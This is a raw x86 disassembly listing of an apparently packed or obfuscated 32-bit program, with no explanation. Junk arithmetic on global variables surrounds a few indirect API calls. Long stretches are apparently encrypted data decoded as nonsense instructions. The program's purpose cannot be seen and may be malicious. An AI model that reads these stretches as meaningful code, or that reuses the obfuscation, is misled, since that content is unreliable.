  40183c:	or     DWORD PTR ds:0x428345,0x7336
  401846:	sbb    DWORD PTR ds:0x428449,0x42f3
  401850:	mov    DWORD PTR ds:0x428579,0x382b
  40185a:	inc    DWORD PTR ds:0x428581
  401860:	mov    DWORD PTR [ebp-0xc],eax
  401863:	mov    eax,ds:0x422580
  401868:	mov    ecx,DWORD PTR [ebp-0xc]
  40186b:	sbb    DWORD PTR ds:0x428465,0xc55
  401875:	mov    eax,DWORD PTR [eax]
  401877:	xor    edx,edi
  401879:	add    eax,DWORD PTR [ecx]
  40187b:	mov    edi,0x32de6d5d
  401880:	mov    ecx,DWORD PTR ds:0x428461
  401886:	sbb    DWORD PTR ds:0x42840d,ecx
  40188c:	mov    DWORD PTR [ebp-0x14],eax
  40188f:	cmp    DWORD PTR ds:0x428569,0x0
  401896:	not    ecx
  401898:	mov    DWORD PTR ds:0x428479,0x2a4e
  4018a2:	mov    edx,DWORD PTR ds:0x42854d
  4018a8:	jmp    0x401900
  4018ad:	mov    DWORD PTR ds:0x428339,0x4cb6
  4018b7:	mov    eax,0x4273
  4018bc:	cmp    DWORD PTR ds:0x428569,0x0
  4018c3:	jle    0x4018e8
  4018c9:	push   DWORD PTR [ebp-0x14]
  4018cc:	push   0x428165
  4018d1:	push   0x4281f1
  4018d6:	call   DWORD PTR ds:0x42e22c
  4018dc:	add    ecx,edx
  4018de:	or     DWORD PTR ds:0x428451,0x428471
  4018e8:	and    ecx,0x1796
  4018ee:	sub    edx,0x208e
  4018f4:	xor    DWORD PTR ds:0x428465,edx
  4018fa:	sub    DWORD PTR ds:0x42846d,ebx
  401900:	mov    eax,DWORD PTR [ebp+0x18]
  401903:	mov    ecx,DWORD PTR [ebp+0x1c]
  401906:	cmp    DWORD PTR ds:0x428419,0x0
  40190d:	movzx  edx,BYTE PTR ds:0x428415
  401914:	mov    edx,DWORD PTR ds:0x4284f1
  40191a:	movzx  edx,WORD PTR ds:0x428579
  401921:	jmp    0x401971
  401926:	mov    DWORD PTR ds:0x428565,0x405c
  401930:	cmp    DWORD PTR ds:0x428419,0x0
  401937:	jge    0x401961
  40193d:	push   DWORD PTR [ebp-0xc]
  401940:	push   DWORD PTR [ebp-0x14]
  401943:	push   0x1391
  401948:	push   0x7a4e
  40194d:	call   DWORD PTR ds:0x42e0a0
  401953:	neg    edx
  401955:	add    edx,0x51c2
  40195b:	sbb    edx,DWORD PTR ds:0x428365
  401961:	adc    DWORD PTR ds:0x428561,ecx
  401967:	sub    DWORD PTR ds:0x428365,0x3064
  401971:	shrd   eax,ecx,0x2
  401975:	shr    ecx,0x2
  401978:	cmp    DWORD PTR ds:0x428475,0x0
  40197f:	mov    ecx,DWORD PTR ds:0x42844d
  401985:	mov    ecx,0x3508
  40198a:	not    edx
  40198c:	jmp    0x4019d4
  401991:	mov    DWORD PTR ds:0x428555,edi
  401997:	mov    DWORD PTR ds:0x428439,0x1955
  4019a1:	cmp    DWORD PTR ds:0x428475,0x0
  4019a8:	je     0x4019cc
  4019ae:	push   0x428243
  4019b3:	push   0x400000
  4019b8:	call   DWORD PTR ds:0x42e0a4
  4019be:	neg    edx
  4019c0:	xor    DWORD PTR ds:0x428341,0x55e7
  4019ca:	sub    ecx,ecx
  4019cc:	not    ecx
  4019ce:	and    ecx,DWORD PTR ds:0x428441
  4019d4:	mov    ecx,DWORD PTR [ebp+0x18]
  4019d7:	mov    edx,DWORD PTR [ebp+0x1c]
  4019da:	add    DWORD PTR ds:0x4284dd,0x428569
  4019e4:	xor    eax,edi
  4019e6:	xor    edx,edx
  4019e8:	or     edx,eax
  4019ea:	and    eax,0x837
  4019ef:	mov    DWORD PTR [ebp-0x3c],edx
  4019f2:	jmp    0x401d93
  4019f7:	inc    DWORD PTR [edx+0x3c]
  4019fa:	pop    ebx
  4019fb:	mov    esp,0xf09aa0bb
  401a00:	fisubr DWORD PTR [edx+0x7e03f7e3]
  401a06:	iret   
  401a07:	mov    esi,0xbdbebecc
  401a0c:	les    edi,FWORD PTR [esi-0x361b9142]
  401a12:	shr    DWORD PTR [eax],0x95
  401a15:	pop    ecx
  401a16:	jae    0x4019e1
  401a18:	ret    
  401a19:	mov    eax,0x195c80aa
  401a1e:	aam    0x9b
  401a20:	mov    DWORD PTR [eax+0x3ac8801a],esp
  401a26:	dec    ebx
  401a27:	ret    
  401a28:	push   eax
  401a29:	test   bh,ah
  401a2b:	sbb    ecx,DWORD PTR [ebx]
  401a2d:	adc    al,0xc0
  401a2f:	push   0x22
  401a31:	jnp    0x401a1b
  401a33:	inc    edi
  401a34:	xor    BYTE PTR [esi],cl
  401a36:	jp     0x401ab6
  401a38:	and    edx,esi
  401a3a:	cmp    eax,0x73b098cc
  401a3f:	mov    al,ds:0xddfe8130
  401a44:	dec    edi
  401a45:	lods   al,BYTE PTR ds:[esi]
  401a46:	out    dx,eax
  401a47:	(bad)  
  401a48:	popf   
  401a49:	push   esi
  401a4a:	pusha  
  401a4b:	dec    DWORD PTR [ecx-0x5e892b41]
  401a51:	jo     0x401ab0
  401a53:	mov    ebp,0x967aba25
  401a58:	in     al,dx
  401a59:	add    al,0x73
  401a5b:	jb     0x401ad9
  401a5d:	sti    
  401a5e:	xor    eax,DWORD PTR [edi]
  401a60:	adc    DWORD PTR [ebx+0x6777e83d],0xa2496db
  401a6a:	sub    al,0x82
  401a6c:	js     0x401a8d
  401a6e:	es jne 0x401a9e
  401a71:	in     al,dx
  401a72:	dec    ecx
  401a73:	push   cs
  401a74:	adc    al,0xcb
  401a76:	sub    ah,BYTE PTR [ebx+0x680b3733]
  401a7c:	mov    cl,0xd9
  401a7e:	pusha  
  401a7f:	pop    esp
  401a80:	adc    ecx,DWORD PTR [ebx-0x3a]
  401a83:	push   eax
  401a84:	arpl   WORD PTR [ebp+0x5f],si
  401a87:	pop    esp
  401a88:	leave  
  401a89:	call   0x1367:0x6e450a69
  401a90:	push   ds
  401a91:	mov    esi,ss
  401a93:	xchg   DWORD PTR [ebx+0x7f94b482],edx
  401a99:	in     al,dx
  401a9a:	jecxz  0x401a8b
  401a9c:	iret   
  401a9d:	sub    DWORD PTR [ebp-0x4dde18d5],edi
  401aa3:	dec    esi
  401aa4:	(bad)  
  401aa5:	jp     0x401a46
  401aa7:	xor    DWORD PTR [ecx+ecx*1],ebx
  401aaa:	jae    0x401a5e
  401aac:	adc    al,0x72
  401aae:	push   edx
  401aaf:	xchg   esp,eax
  401ab0:	ja     0x401b14
  401ab2:	pop    eax
  401ab3:	xor    esp,esp
  401ab5:	cld    
  401ab6:	cdq    
  401ab7:	add    ebp,DWORD PTR [edi+0x1a]
  401aba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401abb:	ja     0x401a43
  401abd:	mov    cl,0x96
  401abf:	std    
  401ac0:	lds    edi,FWORD PTR [ebx]
  401ac2:	jmp    0x194ebeec
  401ac7:	fsubr  DWORD PTR [ecx+0x27]
  401aca:	mov    ah,0xee
  401acc:	mov    dl,0xd5
  401ace:	dec    ebx
  401acf:	jmp    0x401b06
  401ad1:	sbb    dl,BYTE PTR ds:0x3e51334e
  401ad7:	std    
  401ad8:	iret   
  401ad9:	jne    0x401b3f
  401adb:	stc    
  401adc:	xchg   esp,eax
  401add:	jbe    0x401b03
  401adf:	je     0x401b47
  401ae1:	sbb    al,0x1f
  401ae3:	cmp    ch,BYTE PTR cs:[ebp-0x5b]
  401ae7:	or     eax,0xefaaedcd
  401aec:	pop    ebp
  401aed:	ins    DWORD PTR es:[edi],dx
  401aee:	test   eax,0xbf6ca579
  401af3:	pop    esp
  401af4:	xor    eax,0x5d5b0975
  401af9:	cmp    dl,BYTE PTR [edx+0x0]
  401afc:	sub    edi,DWORD PTR [ebx+0x615310c3]
  401b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b03:	jle    0x401b1b
  401b05:	jno    0x401b23
  401b07:	fidivr DWORD PTR [eax+0x53]
  401b0a:	mov    ebp,0x2d05816f
  401b0f:	aaa    
  401b10:	pop    ds
  401b11:	iret   
  401b12:	sub    eax,0x6436e8
  401b17:	bound  eax,QWORD PTR [eax+0x51]
  401b1a:	jns    0x401b04
  401b1c:	jg     0x401b23
  401b1e:	int    0xa0
  401b20:	add    DWORD PTR [ecx+0x1b],ecx
  401b23:	xor    esi,DWORD PTR ds:0x39183b57
  401b29:	jp     0x401af0
  401b2b:	jno    0x401b5c
  401b2d:	aad    0x4f
  401b2f:	hlt    
  401b30:	sub    DWORD PTR [ebp+ebx*8-0x7],0xffffffe9
  401b35:	inc    ecx
  401b36:	popf   
  401b37:	jle    0x401aef
  401b39:	pusha  
  401b3a:	jns    0x401b76
  401b3c:	or     al,0x9f
  401b3e:	(bad)  
  401b3f:	dec    ebp
  401b40:	pop    edx
  401b41:	popa   
  401b42:	imul   ebx,DWORD PTR [edx],0xffffff8f
  401b45:	mov    al,0xaa
  401b47:	pop    edi
  401b48:	jb     0x401b5a
  401b4a:	scas   eax,DWORD PTR es:[edi]
  401b4b:	adc    al,0xa0
  401b4d:	push   es
  401b4e:	dec    ebp
  401b4f:	jl     0x401b09
  401b51:	inc    ebp
  401b52:	push   ebp
  401b53:	cli    
  401b54:	mov    esi,0xa695ea86
  401b59:	cmp    ch,BYTE PTR [ebx-0xb27d192]
  401b5f:	dec    ebp
  401b60:	repnz pop edx
  401b62:	inc    eax
  401b63:	dec    edx
  401b64:	fs cwde 
  401b66:	bound  ebp,QWORD PTR [edi-0x12]
  401b69:	aaa    
  401b6a:	fwait
  401b6b:	push   ebx
  401b6c:	jp     0x401b6c
  401b6e:	aas    
  401b6f:	arpl   di,bp
  401b71:	(bad)  [eax+0x4a371a3]
  401b77:	jle    0x401b55
  401b79:	add    BYTE PTR [edx+0x66],bl
  401b7c:	push   0x7d
  401b7e:	and    eax,0x319a28f5
  401b83:	in     al,dx
  401b84:	adc    DWORD PTR [edx],esi
  401b86:	gs pop eax
  401b88:	sbb    cl,cl
  401b8a:	cmp    al,0x8a
  401b8c:	ja     0x401bc7
  401b8e:	pop    ebx
  401b8f:	cmp    al,0x3a
  401b91:	les    ebx,FWORD PTR [edi+0x5b7759e5]
  401b97:	test   DWORD PTR [ebx-0x5678dc74],0xbb7ca9f4
  401ba1:	adc    ecx,DWORD PTR [edx]
  401ba3:	push   ebx
  401ba4:	sub    al,dl
  401ba6:	push   ds
  401ba7:	jle    0x401bef
  401ba9:	loopne 0x401b9d
  401bab:	ds inc edi
  401bad:	add    DWORD PTR [edi],ecx
  401baf:	jecxz  0x401ba6
  401bb1:	mov    ebp,0x3afecd5e
  401bb6:	or     cl,BYTE PTR [edi+0x7b]
  401bb9:	mov    esp,0xf928a46e
  401bbe:	push   edi
  401bbf:	lea    eax,[esi+0x4eb3936c]
  401bc5:	xchg   ebp,eax
  401bc6:	jle    0x401ba2
  401bc8:	scas   al,BYTE PTR es:[edi]
  401bc9:	push   esi
  401bca:	jbe    0x401c45
  401bcc:	or     al,bl
  401bce:	mov    ebp,0x927c76b4
  401bd3:	adc    eax,0x35abe4e2
  401bd8:	jmp    0x401bb5
  401bda:	out    dx,al
  401bdb:	and    ebp,ebx
  401bdd:	fs sub al,0xf1
  401be0:	pop    ss
  401be1:	fidivr DWORD PTR [ebx]
  401be3:	nop
  401be4:	rcr    BYTE PTR [ebx-0x5b],1
  401be7:	out    dx,al
  401be8:	inc    esi
  401be9:	test   al,0x50
  401beb:	pop    eax
  401bec:	sub    eax,0xa322eaa8
  401bf1:	pop    ebx
  401bf2:	jle    0x401b88
  401bf4:	adc    dh,BYTE PTR [ecx-0x69]
  401bf7:	mov    edi,0x554ffd5b
  401bfc:	jae    0x401c3b
  401bfe:	dec    edi
  401bff:	mul    BYTE PTR [ebp+0x46405cc6]
  401c05:	pop    edi
  401c06:	jns    0x401bb6
  401c08:	or     DWORD PTR [eax-0x18],ebx
  401c0b:	adc    ebx,DWORD PTR [esi+0x75]
  401c0e:	outs   dx,BYTE PTR ds:[esi]
  401c0f:	sbb    ch,0xd2
  401c12:	sbb    al,0x8b
  401c14:	jge    0x401c38
  401c16:	call   0x5706afba
  401c1b:	loopne 0x401bfd
  401c1d:	mov    edx,0xf0730c60
  401c22:	jae    0x401c34
  401c24:	pop    ds
  401c25:	jmp    0x401c57
  401c27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c28:	push   cs
  401c29:	test   esi,edx
  401c2b:	icebp  
  401c2c:	xor    cl,BYTE PTR [ecx]
  401c2e:	mul    DWORD PTR [eax]
  401c30:	js     0x401c63
  401c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c33:	push   0x4c
  401c35:	xchg   BYTE PTR [esi],dl
  401c37:	or     BYTE PTR [ecx+ecx*8],bh
  401c3a:	adc    eax,0x4b830b28
  401c3f:	test   ah,al
  401c41:	sahf   
  401c42:	int    0xc9
  401c44:	in     al,dx
  401c45:	loop   0x401c3d
  401c47:	sub    edi,esi
  401c49:	jae    0x401c40
  401c4b:	std    
  401c4c:	ins    BYTE PTR es:[edi],dx
  401c4d:	scas   al,BYTE PTR es:[edi]
  401c4e:	out    dx,eax
  401c4f:	xlat   BYTE PTR ds:[ebx]
  401c50:	fisub  DWORD PTR [eax+0x3e1385d9]
  401c56:	ds sbb al,0xb1
  401c59:	mov    WORD PTR ds:0xf08ee3b2,gs
  401c5f:	leave  
  401c60:	aam    0xd7
  401c62:	call   0xc6f8:0x62c267a2
  401c69:	shl    dl,1
  401c6b:	pop    ecx
  401c6c:	into   
  401c6d:	clc    
  401c6e:	dec    ecx
  401c6f:	or     edi,DWORD PTR [esi]
  401c71:	fiadd  DWORD PTR [eax+0x48649e43]
  401c77:	push   cs
  401c78:	inc    ebp
  401c79:	cmove  edi,edx
  401c7c:	or     al,0xa1
  401c7e:	sbb    al,0x30
  401c80:	add    al,0xe4
  401c82:	jmp    DWORD PTR [ebx-0x58]
  401c85:	xchg   esi,eax
  401c86:	cvtps2pd xmm5,QWORD PTR [esi-0x32308fdb]
  401c8d:	push   ds
  401c8e:	push   es
  401c8f:	int3   
  401c90:	retf   
  401c91:	rol    DWORD PTR [ebx+0x15],1
  401c94:	add    DWORD PTR [edx],0xe
  401c97:	retf   
  401c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c99:	xchg   BYTE PTR [ecx-0x16],ah
  401c9c:	(bad)  
  401c9d:	lods   eax,DWORD PTR ds:[esi]
  401c9e:	cwde   
  401c9f:	xchg   esp,eax
  401ca0:	jne    0x401cf8
  401ca2:	inc    edx
  401ca3:	jae    0x401ca7
  401ca5:	cmp    eax,0x421f04ed
  401caa:	xchg   ebx,eax
  401cab:	adc    esp,ebp
  401cad:	hlt    
  401cae:	mov    eax,0x6b7d4fba
  401cb3:	push   0xffffff83
  401cb5:	mov    al,ds:0x3ea10a2a
  401cba:	jge    0x401cc9
  401cbc:	sbb    dh,BYTE PTR [ebx+0x76fd8816]
  401cc2:	jne    0x401d1a
  401cc4:	mov    al,ds:0x144972de
  401cc9:	and    ebx,DWORD PTR ds:0x4d0b40c5
  401ccf:	xchg   ebp,eax
  401cd0:	push   ecx
  401cd1:	frstor [eax+edi*2]
  401cd4:	ds ins BYTE PTR es:[edi],dx
  401cd6:	and    al,0xc4
  401cd8:	push   ss
  401cd9:	popf   
  401cda:	or     DWORD PTR [ebx],edi
  401cdc:	dec    eax
  401cdd:	retf   
  401cde:	dec    ebx
  401cdf:	not    BYTE PTR [edi-0x63b79d3e]
  401ce5:	or     bl,BYTE PTR [edx]
  401ce7:	push   0x25009fa8
  401cec:	popf   
  401ced:	xor    dl,BYTE PTR [ebp+0x76]
  401cf0:	mov    al,ds:0xdb804373
  401cf5:	sbb    DWORD PTR [ebx-0x52],0xffffffdc
  401cf9:	xchg   BYTE PTR [edx-0x68],bh
  401cfc:	or     ebx,ebx
  401cfe:	scas   al,BYTE PTR es:[edi]
  401cff:	add    eax,0xf4775976
  401d04:	xchg   edx,eax
  401d05:	dec    esp
  401d06:	jbe    0x401c9b
  401d08:	es into 
  401d0a:	cli    
  401d0b:	jo     0x401d1a
  401d0d:	jns    0x401d04
  401d0f:	xchg   esi,eax
  401d10:	out    0x94,al
  401d12:	xchg   esp,eax
  401d13:	sub    cl,BYTE PTR ds:0xa39c9455
  401d19:	xchg   DWORD PTR [eax],edx
  401d1b:	loope  0x401d55
  401d1d:	in     eax,0x5e
  401d1f:	aad    0xd7
  401d21:	push   ss
  401d22:	cmc    
  401d23:	pop    ebp
  401d24:	wrmsr  
  401d26:	mov    gs,WORD PTR [ecx+0x6a664bc8]
  401d2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d2d:	ret    0x30ce
  401d30:	dec    ecx
  401d31:	aaa    
  401d32:	adc    ebx,DWORD PTR [edi]
  401d34:	retf   0x1200
  401d37:	or     al,0xfe
  401d39:	ins    DWORD PTR es:[edi],dx
  401d3a:	or     eax,0x5d33f1e7
  401d3f:	ds jne 0x401d42
  401d42:	jl     0x401d46
  401d44:	nop
  401d45:	in     al,0x42
  401d47:	xchg   edx,eax
  401d48:	mov    ds:0x47618f7f,al
  401d4d:	lods   al,BYTE PTR ds:[esi]
  401d4e:	xor    ecx,DWORD PTR [esi-0x3d8894c0]
  401d54:	pop    esi
  401d55:	mov    esp,ebp
  401d57:	jo     0x401d72
  401d59:	aaa    
  401d5a:	pop    ebp
  401d5b:	cmp    ecx,DWORD PTR [ecx]
  401d5d:	adc    edx,DWORD PTR [ecx+0x5fd27c03]
  401d63:	in     al,0xed
  401d65:	fidiv  WORD PTR [ecx+0x17da3184]
  401d6b:	xchg   edi,eax
  401d6c:	scas   al,BYTE PTR es:[edi]
  401d6d:	pop    es
  401d6e:	pop    esi
  401d6f:	push   edx
  401d70:	pusha  
  401d71:	mov    ds:0xf6d8bca1,eax
  401d76:	xchg   ebp,eax
  401d77:	mov    bh,0x88
  401d79:	add    esp,DWORD PTR [eax]
  401d7b:	pushf  
  401d7c:	adc    BYTE PTR [esi],0x37
  401d7f:	push   eax
  401d80:	adc    ecx,edi
  401d82:	mov    al,0xbd
  401d84:	jb     0x401de2
  401d86:	xor    al,0x42
  401d88:	ret    
  401d89:	fwait
  401d8a:	sub    ch,BYTE PTR [esi+0x54]
  401d8d:	mov    dl,0x3
  401d8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d90:	mov    edx,0x45c7cf64
  401d95:	nop
  401d96:	push   ebp
  401d97:	sub    al,0x0
  401d99:	add    bh,al
  401d9b:	inc    ebp
  401d9c:	xchg   esp,eax
  401d9d:	outs   dx,DWORD PTR ds:[esi]
  401d9e:	inc    ebp
  401d9f:	add    BYTE PTR [eax],al
  401da1:	mov    DWORD PTR [ebp-0x70],0x78a6
  401da8:	mov    DWORD PTR [ebp-0x6c],0x188
  401daf:	sbb    DWORD PTR ds:0x428425,ecx
  401db5:	mov    DWORD PTR [ebp-0x70],0x5b3f
  401dbc:	mov    DWORD PTR [ebp-0x6c],0x3219
  401dc3:	add    DWORD PTR ds:0x42855d,0x3158
  401dcd:	mov    DWORD PTR [ebp-0x70],0x231c
  401dd4:	add    eax,DWORD PTR ds:0x42840d
  401dda:	mov    DWORD PTR [ebp-0x6c],0x1337
  401de1:	sub    DWORD PTR ds:0x428371,edx
  401de7:	mov    DWORD PTR [ebp-0x70],0x7593
  401dee:	mov    DWORD PTR [ebp-0x6c],0x11b8
  401df5:	movzx  eax,BYTE PTR ds:0x42834d
  401dfc:	and    DWORD PTR ds:0x428575,eax
  401e02:	mov    DWORD PTR [ebp-0x70],0x3b72
  401e09:	mov    DWORD PTR [ebp-0x6c],0x3abc
  401e10:	cmp    DWORD PTR ds:0x428415,0x0
  401e17:	mov    DWORD PTR ds:0x42854d,0x646
  401e21:	mov    DWORD PTR ds:0x428425,0x14a3
  401e2b:	jmp    0x401eb8
  401e30:	movzx  eax,WORD PTR ds:0x4284f1
  401e37:	mov    DWORD PTR ds:0x428415,ebx
  401e3d:	cmp    DWORD PTR ds:0x428415,0x0
  401e44:	jle    0x401e86
  401e4a:	push   DWORD PTR [ebp-0x20]
  401e4d:	push   0x428243
  401e52:	push   0x428147
  401e57:	push   0x400000
  401e5c:	call   DWORD PTR ds:0x42e230
  401e62:	xor    DWORD PTR ds:0x42854d,0x4536
  401e6c:	sub    DWORD PTR ds:0x4284d5,edi
  401e72:	sbb    DWORD PTR ds:0x42843d,0x42854d
  401e7c:	add    DWORD PTR ds:0x428465,0x5ddd
  401e86:	sbb    DWORD PTR ds:0x428575,0x428425
  401e90:	adc    DWORD PTR ds:0x428569,0x5ea9
  401e9a:	sub    DWORD PTR ds:0x428559,0x428545
  401ea4:	add    DWORD PTR ds:0x428345,0x5dac
  401eae:	add    DWORD PTR ds:0x42833d,0x46fc
  401eb8:	mov    DWORD PTR [ebp-0x68],0x1b45
  401ebf:	xor    DWORD PTR ds:0x428431,edx
  401ec5:	mov    DWORD PTR [ebp-0x64],0x767d
  401ecc:	or     DWORD PTR ds:0x42854d,edi
  401ed2:	mov    DWORD PTR [ebp-0x60],0x1d973857
  401ed9:	mov    DWORD PTR [ebp-0x5c],0x0
  401ee0:	mov    DWORD PTR [ebp-0x34],0x599d
  401ee7:	xor    eax,DWORD PTR ds:0x4284c5
  401eed:	mov    DWORD PTR [ebp-0x2c],0x165d
  401ef4:	mov    DWORD PTR [ebp-0x1c],0xc51
  401efb:	xor    eax,eax
  401efd:	add    eax,DWORD PTR ds:0x428359
  401f03:	or     eax,DWORD PTR ds:0x428435
  401f09:	mov    ds:0x428359,eax
  401f0e:	mov    DWORD PTR [ebp-0x44],0x3f55
  401f15:	cmp    DWORD PTR ds:0x42855d,0x0
  401f1c:	mov    DWORD PTR ds:0x428335,0xd43
  401f26:	mov    DWORD PTR ds:0x428579,0x5a6d
  401f30:	mov    DWORD PTR ds:0x42841d,edx
  401f36:	jmp    0x40200c
  401f3b:	mov    eax,0x36f8
  401f40:	mov    DWORD PTR ds:0x428475,edx
  401f46:	cmp    DWORD PTR ds:0x42855d,0x0
  401f4d:	jg     0x401f82
  401f53:	push   0x4521
  401f58:	push   0x4861
  401f5d:	push   DWORD PTR [ebp-0x20]
  401f60:	push   0x428238
  401f65:	push   DWORD PTR [ebp-0x28]
  401f68:	call   DWORD PTR ds:0x42e0a8
  401f6e:	adc    DWORD PTR ds:0x428445,0x7cd6
  401f78:	sbb    DWORD PTR ds:0x4284f1,0xfa0
  401f82:	adc    DWORD PTR ds:0x428451,0x42833d
  401f8c:	add    DWORD PTR ds:0x428359,0x428471
  401f96:	cmp    DWORD PTR ds:0x42854d,0x0
  401f9d:	mov    DWORD PTR ds:0x428475,0x6252
  401fa7:	mov    DWORD PTR ds:0x428371,0x40d0
  401fb1:	jmp    0x40200c
  401fb6:	mov    DWORD PTR ds:0x428555,edx
  401fbc:	cmp    DWORD PTR ds:0x42854d,0x0
  401fc3:	ja     0x401fee
  401fc9:	push   0x428165
  401fce:	call   DWORD PTR ds:0x42e234
  401fd4:	and    DWORD PTR ds:0x42835d,0x4284f9
  401fde:	sbb    DWORD PTR ds:0x428439,0x5068
  401fe8:	xor    DWORD PTR ds:0x4284f1,edi
  401fee:	and    DWORD PTR ds:0x4284e1,0x42857d
  401ff8:	xor    DWORD PTR ds:0x4284f9,0x428575
  402002:	add    DWORD PTR ds:0x428545,0xd3c
  40200c:	mov    DWORD PTR [ebp-0x44],0x1
  402013:	mov    DWORD PTR [ebp-0x44],0x42e8
  40201a:	mov    eax,DWORD PTR [ebp-0x60]
  40201d:	add    DWORD PTR ds:0x428355,0x4284cd
  402027:	shl    ecx,0x1e
  40202a:	mov    ecx,DWORD PTR [ebp-0x5c]
  40202d:	add    DWORD PTR ds:0x4284d5,0x5f4
  402037:	push   ecx
  402038:	adc    DWORD PTR ds:0x4284fd,0x428349
  402042:	push   eax
  402043:	or     DWORD PTR ds:0x428501,0x4284dd
  40204d:	push   0xddf
  402052:	sbb    DWORD PTR ds:0x428361,0x218d
  40205c:	jmp    0x4023fd
  402061:	mov    ebp,0x2b7a2504
  402066:	jl     0x401ffa
  402068:	mov    esp,0x9e22191a
  40206d:	cmp    BYTE PTR [esp+edi*4],0xa4
  402071:	mov    ebp,0xbdbebed2
  402076:	les    edi,FWORD PTR [esi-0x5182f842]
  40207c:	xchg   ecx,eax
  40207d:	push   eax
  40207e:	dec    ebx
  40207f:	dec    eax
  402080:	inc    esi
  402081:	push   ebp
  402082:	mov    ?,WORD PTR ds:0xc8c7cfc
  402088:	out    0x4d,eax
  40208a:	push   esi
  40208b:	xchg   edi,eax
  40208c:	dec    edx
  40208d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40208e:	mov    dl,0xcb
  402090:	fwait
  402091:	retf   0x976d
  402094:	inc    bp
  402096:	pop    ds
  402097:	mov    eax,0x969ce0a1
  40209c:	rcl    BYTE PTR [edi],0x7
  40209f:	sbb    esi,DWORD PTR [ecx-0x24747aed]
  4020a5:	dec    ebx
  4020a6:	add    al,BYTE PTR [ebx]
  4020a8:	stos   DWORD PTR es:[edi],eax
  4020a9:	jge    0x40211e
  4020ab:	sub    DWORD PTR [ecx-0x17],esi
  4020ae:	repnz or BYTE PTR [esi-0x2e],bh
  4020b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020b3:	scas   al,BYTE PTR es:[edi]
  4020b4:	and    DWORD PTR [ebp-0x2051f83d],ebp
  4020ba:	cmp    ah,0xcd
  4020bd:	pop    ebp
  4020be:	out    dx,eax
  4020bf:	mov    ebx,0x3cbd336
  4020c4:	sub    ecx,DWORD PTR [ebx]
  4020c6:	dec    edx
  4020c7:	inc    eax
  4020c8:	sub    ah,ah
  4020ca:	pop    esi
  4020cb:	push   esi
  4020cc:	and    edx,esi
  4020ce:	das    
  4020cf:	and    bl,BYTE PTR [esp+ecx*2-0x38a57c35]
  4020d6:	push   0x15a35b76
  4020db:	push   esp
  4020dc:	mov    ah,0xf9
  4020de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020df:	xlat   BYTE PTR ds:[ebx]
  4020e0:	mov    bh,0x8c
  4020e2:	pop    edi
  4020e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020e4:	jae    0x4020d7
  4020e6:	test   eax,0x9f64c044
  4020ec:	pop    ebp
  4020ed:	push   eax
  4020ee:	dec    edi
  4020ef:	ins    DWORD PTR es:[edi],dx
  4020f0:	add    esp,esi
  4020f2:	scas   eax,DWORD PTR es:[edi]
  4020f3:	repz and dh,BYTE PTR [esi+0x6f0b23cc]
  4020fa:	xor    BYTE PTR [ebx],bl
  4020fc:	ret    
  4020fd:	or     DWORD PTR ds:0x2231a3a7,ecx
  402103:	aaa    
  402104:	ins    BYTE PTR es:[edi],dx
  402105:	repz mov ds:0x3f573e24,al
  40210b:	pop    ebp
  40210c:	jo     0x402165
  40210e:	dec    esi
  40210f:	ja     0x402138
  402111:	cmp    cl,dl
  402113:	into   
  402114:	jnp    0x402103
  402116:	sbb    al,0x8f
  402118:	or     eax,0x3bd15957
  40211d:	stos   BYTE PTR es:[edi],al
  40211e:	test   al,0x16
  402120:	xchg   BYTE PTR [ebx+0x2a],bl
  402123:	cmp    DWORD PTR [ebp-0x7e7eba3b],0x56eae892
  40212d:	retf   
  40212e:	sbb    dl,BYTE PTR [esp+ebp*2+0x2f03855]
  402135:	fisub  WORD PTR [ebx+0x71]
  402138:	adc    eax,0xc1f4b529
  40213d:	mov    edi,0x5523bd22
  402142:	add    DWORD PTR [esi],ecx
  402144:	arpl   WORD PTR [ecx-0x29],cx
  402147:	pop    edi
  402148:	fstp   st(7)
  40214a:	call   0xd57e:0x3b3e5204
  402151:	into   
  402152:	cmp    eax,0x5ce35b46
  402157:	cdq    
  402158:	lock in eax,0x1e
  40215b:	das    
  40215c:	sbb    ebx,eax
  40215e:	cmovp  esi,DWORD PTR [esi-0x64]
  402162:	xchg   ecx,eax
  402163:	fs jge 0x4021d7
  402166:	inc    ecx
  402167:	inc    esp
  402168:	or     ebp,DWORD PTR [ebx+0x3a063d01]
  40216e:	dec    esi
  40216f:	sbb    ch,ah
  402171:	sbb    BYTE PTR [ebx],bh
  402173:	add    DWORD PTR [esi+0x3],esi
  402176:	mov    al,0xfd
  402178:	xchg   ebx,eax
  402179:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40217a:	in     al,0xdf
  40217c:	mov    esi,0x21509c9d
  402181:	inc    ebp
  402182:	icebp  
  402183:	(bad)  
  402184:	lar    esi,WORD PTR [edi]
  402187:	cld    
  402188:	inc    edx
  402189:	popa   
  40218a:	cmp    eax,0x6eaefdbf
  40218f:	stos   BYTE PTR es:[edi],al
  402190:	add    ch,bh
  402192:	cmp    al,BYTE PTR [esi+0x9c0311d]
  402198:	lea    esi,[ecx-0x66b9e7e3]
  40219e:	dec    esi
  40219f:	add    DWORD PTR [esp+ebp*2+0x6e25a279],0x1ce1eeab
  4021aa:	loope  0x402152
  4021ac:	mov    edi,0x919e10e9
  4021b1:	lods   eax,DWORD PTR ds:[esi]
  4021b2:	fs mov dl,dh
  4021b5:	in     al,dx
  4021b6:	jecxz  0x402237
  4021b8:	mov    bh,0xc
  4021ba:	mov    BYTE PTR [edi],ch
  4021bc:	popf   
  4021bd:	xor    DWORD PTR [eax+0x42d2854f],ebp
  4021c3:	push   cs
  4021c4:	aaa    
  4021c5:	mov    edi,0x83716228
  4021ca:	dec    edx
  4021cb:	pop    eax
  4021cc:	call   0x910883c1
  4021d1:	into   
  4021d2:	jnp    0x40218c
  4021d4:	mov    ebp,0x4a0072a8
  4021d9:	jecxz  0x4021d8
  4021db:	(bad)  
  4021dc:	iret   
  4021dd:	ret    
  4021de:	cmp    ecx,edi
